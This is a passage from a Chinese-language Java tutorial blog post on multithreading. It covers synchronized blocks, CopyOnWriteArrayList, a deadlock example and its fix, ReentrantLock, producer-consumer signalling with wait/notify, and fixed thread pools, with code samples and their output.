title="同步块"></a>同步块</h2><p>同步块:synchronized(Obj){}</p><p>Obj称之同步监视器</p><ul><li>Obj可以时任何对象，但是推荐使用共享资源作为监视器</li><li>同步方法中无需指定同步监视器，因为同步方法的同步监视器时this，就是这个对象本身，或者是class。</li></ul><p>同步监视器的执行过程</p><ol><li>第一个线程访问，锁定同步监视器，执行其中代码</li><li>第二个线程访问，发现同步监视器被锁定，无法访问</li><li>第一个线程访问完毕，接触同步监视器</li><li>第二个线程访问，发现同步监视器没有锁，然后锁定并访问。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">synList</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        ArrayList arrayList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> Thread( ()-&gt;&#123;</span><br><span class="line">                <span class="comment">// 增加同步块</span></span><br><span class="line">                <span class="keyword">synchronized</span> (arrayList)&#123;</span><br><span class="line">                    arrayList.add(Thread.currentThread().getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; ).start();</span><br><span class="line">        &#125;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        System.out.println(arrayList.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201301151858.png"></p><h2 id="CopyOnWriteArrayList"><a href="#CopyOnWriteArrayList" class="headerlink" title="CopyOnWriteArrayList"></a>CopyOnWriteArrayList</h2><p>它是java并发包下的集合，是一个线程安全的集合。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 测试安全类型集合</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GucList</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        CopyOnWriteArrayList arrayList = <span class="keyword">new</span> CopyOnWriteArrayList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> Thread(()-&gt;&#123;arrayList.add(Thread.currentThread().getName());&#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        System.out.println(arrayList.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10000</span></span><br><span class="line"></span><br><span class="line">Process finished with exit code <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h1><p>多个线程各自占有一些共享资源，并且相互等待其他线程占有的资源才能运行，而导致两个或者多个线程都在等待对象释放资源，都停止执行的情形，某一个同步块同时拥有<code>两个以上对象的锁</code>时就可能会发生死锁的问题。</p><h2 id="如何避免产生死锁"><a href="#如何避免产生死锁" class="headerlink" title="如何避免产生死锁"></a>如何避免产生死锁</h2><p>产生死锁的必要条件:</p><ol><li>互斥条件: 一个资源每次只能被一个进程使用。</li><li>请求与保持条件，一个进程因请求资源而阻塞时，对已获得资源保持不变</li><li>不剥夺条件，进程已获得的资源，在未使用完之前，不能强行剥夺</li><li>循环等待条件，若干进程之间形成一种头尾相接的循环等待资源关系</li></ol><p><code>上面四种出现死锁的必要条件，只要破其中一个或多个就可以避免死锁的发生。</code></p><p>死锁示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeadLock</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Makeup makeup = <span class="keyword">new</span> Makeup(<span class="number">0</span>,<span class="string">&quot;白雪公主&quot;</span>);</span><br><span class="line">        Makeup makeup1 = <span class="keyword">new</span> Makeup(<span class="number">1</span>,<span class="string">&quot;白马王子&quot;</span>);</span><br><span class="line">        makeup.start();</span><br><span class="line">        makeup1.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 口红</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lipstick</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//镜子</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mirror</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Makeup</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line"><span class="comment">//    保证资源只有一份</span></span><br><span class="line">    <span class="keyword">static</span> Lipstick lipstick = <span class="keyword">new</span> Lipstick();</span><br><span class="line">    <span class="keyword">static</span> Mirror mirror = <span class="keyword">new</span> Mirror();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> choice; <span class="comment">//选择</span></span><br><span class="line">    String girName; <span class="comment">// 使用的人</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Makeup</span><span class="params">(<span class="keyword">int</span> choice, String girName)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.choice = choice;</span><br><span class="line">        <span class="keyword">this</span>.girName = girName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            makeup();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">makeup</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(choice==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (lipstick)&#123;</span><br><span class="line">                System.out.println(<span class="keyword">this</span>.girName+<span class="string">&quot;获得口红的锁&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                <span class="keyword">synchronized</span> (mirror)&#123;</span><br><span class="line">                    System.out.println(<span class="keyword">this</span>.girName+<span class="string">&quot;获得镜子的锁&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (mirror)&#123;</span><br><span class="line">                System.out.println(<span class="keyword">this</span>.girName+<span class="string">&quot;获得镜子的锁&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                <span class="keyword">synchronized</span> (lipstick)&#123;</span><br><span class="line">                    System.out.println(<span class="keyword">this</span>.girName+<span class="string">&quot;获得口红的锁&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解锁死锁</p><p>只需要不让他们抱同一把锁即可</p><p>改进代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">makeup</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(choice==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (lipstick)&#123;</span><br><span class="line">            System.out.println(<span class="keyword">this</span>.girName+<span class="string">&quot;获得口红的锁&quot;</span>);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">synchronized</span> (mirror)&#123;</span><br><span class="line">            System.out.println(<span class="keyword">this</span>.girName+<span class="string">&quot;获得镜子的锁&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (mirror)&#123;</span><br><span class="line">            System.out.println(<span class="keyword">this</span>.girName+<span class="string">&quot;获得镜子的锁&quot;</span>);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">synchronized</span> (lipstick)&#123;</span><br><span class="line">            System.out.println(<span class="keyword">this</span>.girName+<span class="string">&quot;获得口红的锁&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ReentranLock"><a href="#ReentranLock" class="headerlink" title="ReentranLock"></a>ReentranLock</h2><p>从JDK5.0开始，java提供了更强大的线程同步机制—通过现式定义同步锁对象来实现同步。同步锁使用Lock对象充当</p><p>Java.util.concurrent.locks.Lock接口是控制多个线程对共享资源进行访问的工具。锁提供了对共享资源的独占访问，每次只能有一个线程对Lock对象加锁，线程开始访问共享资源之前应先获得Lock对象</p><p>ReentranLock类实现了Lock，它拥有与synchronized相同的并发性和内存语义，在实现线程安全的控制中，比较常用的时ReentrantLock,可以现式加锁、释放锁</p><p>Lock锁的定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">priver <span class="keyword">final</span> ReentrantLock lock = <span class="keyword">new</span> ReetrantLock();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m</span><span class="params">()</span></span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//保证线程安全代码</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span>&#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">            <span class="comment">//如果同步代码有异常, 要将unlock()写入finally语句块</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LockTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        LokTest2 lokTest2 = <span class="keyword">new</span> LokTest2();</span><br><span class="line">        <span class="keyword">new</span> Thread(lokTest2, <span class="string">&quot;1&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(lokTest2, <span class="string">&quot;2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LokTest2</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> ticknume = <span class="number">10</span>;</span><br><span class="line">    <span class="comment">// 加锁</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ReentrantLock reentrantLock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            <span class="comment">// 获取资源区加锁</span></span><br><span class="line">            reentrantLock.lock();</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(ticknume &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()+<span class="string">&quot;-&gt;&gt;&quot;</span>+ticknume--);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//释放锁</span></span><br><span class="line">            reentrantLock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="ReentranLock对比synchronized"><a href="#ReentranLock对比synchronized" class="headerlink" title="ReentranLock对比synchronized"></a>ReentranLock对比synchronized</h2><p>Lock时显式锁(手动开启和关闭锁。别忘记关闭锁) synchronized时影式锁，出了作用域自动释放。</p><p>Lock只有代码锁，synchronized有代码块锁和方法锁</p><p>使用Lock锁，JVM将花费较少的时间来调整线程，性能更好，并且有更好的扩展性(提供更多的子类)</p><p>优先使用顺序</p><ul><li>Lock &gt; 同步代码块 (已经进入了方法体，分配相应资源) &gt; 同步方法(在方法体之外)</li></ul><h1 id="线程通信"><a href="#线程通信" class="headerlink" title="线程通信"></a>线程通信</h1><p>应用场景:生产者和消费者问题</p><p>​    假设仓库中只能存放一件产品，生产者将生产出来的产品放入仓库，消费者将仓库中的产品取走消费</p><p>​    如果仓库中没有产品，则生产者将产品放入仓库，否则停止生产并等待，直到仓库中的产品被消费者取走为止</p><p>​    如果仓库中放有产品，则消费者可以将产品取走消费，否则停止消费并等待，直到仓库中再次放入产品为止。</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201301351845.png"></p><p>通信方法</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201301430397.png"></p><p><code>注意：只能在同步方法或者在同步代码块中使用不然会抛出IIIegaMonitorStateExepion异常</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Tv tv = <span class="keyword">new</span> Tv();</span><br><span class="line">        <span class="keyword">new</span> Player(tv).start();</span><br><span class="line">        <span class="keyword">new</span> Watcher(tv).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Player</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    Tv tv;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Player</span><span class="params">(Tv tv)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.tv = tv;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">this</span>.tv.play(<span class="string">&quot;京剧&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.tv.play(<span class="string">&quot;广告&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Watcher</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    Tv tv;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Watcher</span><span class="params">(Tv tv)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.tv = tv;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">this</span>.tv.witch();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tv</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String vice; <span class="comment">//节目</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> flag = <span class="keyword">true</span>; <span class="comment">// 演员T 观众F</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 表演</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">play</span><span class="params">(String vice)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.vice = vice;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在表演:&quot;</span>+vice);</span><br><span class="line">        <span class="comment">// 通知观众观看</span></span><br><span class="line">        <span class="keyword">this</span>.notify();</span><br><span class="line">        <span class="keyword">this</span>.flag = !<span class="keyword">this</span>.flag;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 观看</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">witch</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在看:&quot;</span>+vice);</span><br><span class="line">        <span class="comment">// 通知演员表演</span></span><br><span class="line">        <span class="keyword">this</span>.notify();</span><br><span class="line">        <span class="keyword">this</span>.flag = !<span class="keyword">this</span>.flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">正在表演:京剧</span><br><span class="line">正在看:京剧</span><br><span class="line">正在表演:广告</span><br><span class="line">正在看:广告</span><br><span class="line">正在表演:京剧</span><br><span class="line">正在看:京剧</span><br><span class="line">正在表演:广告</span><br><span class="line">正在看:广告</span><br><span class="line">正在表演:京剧</span><br><span class="line">正在看:京剧</span><br><span class="line">正在表演:广告</span><br><span class="line">正在看:广告</span><br><span class="line"></span><br><span class="line">Process finished with exit code <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h1><p>经常创建和销毁，使用大量资源，比如并发情况下的线程，对性能影响很大。</p><p><code>思路:</code> 提前创建好多个线程，放入线程池中，使用时直接获取，使用完放回池子中，可以避免频繁创建销毁，实现重复利用。</p><p>好处；</p><p>​    提高响应数度，减少创建新线程的时间</p><p>​    降低资源消耗，重复利用线程池中的线程，不需要每次都创建</p><p>​    便于线程管理</p><p>​        corePoolSize: 核心池的大小</p><p>​        maximumPoolSize: 最大线程数</p><p>​        keepAliveTime: 线程没有任务时最多保持多长时间后会终止</p><h2 id="使用线程池"><a href="#使用线程池" class="headerlink" title="使用线程池"></a>使用线程池</h2><p>JDK5.0提供了相关的APIEXecutorService和Executors</p><p>ExecutorService：真正的线程池接口。常见子类THreadPoolExecutor</p><ul><li>void execute(Runnable command) 执行任务, 没有返回值,一般用来执行Runnable</li><li><T>Future<T>submit(Callable<T>task): 执行任务有返回值, 一般用来执行Callable</li><li>void shutdown(): 关闭线程池</li></ul><p>Executors: 工具类、线程池的工厂类、用于创建并返回不同类型的线程池</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadPool</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建线程池</span></span><br><span class="line">        ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">3</span>);</span><br><span class="line">        <span class="comment">// 启动线程池</span></span><br><span class="line">        executorService.execute(<span class="keyword">new</span> Pool());</span><br><span class="line">        executorService.execute(<span class="keyword">new</span> Pool());</span><br><span class="line">        executorService.execute(<span class="keyword">new</span> Pool());</span><br><span class="line"></span><br><span class="line">        executorService.shutdown();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pool</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaSE </tag>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GUI可视化编程</title>
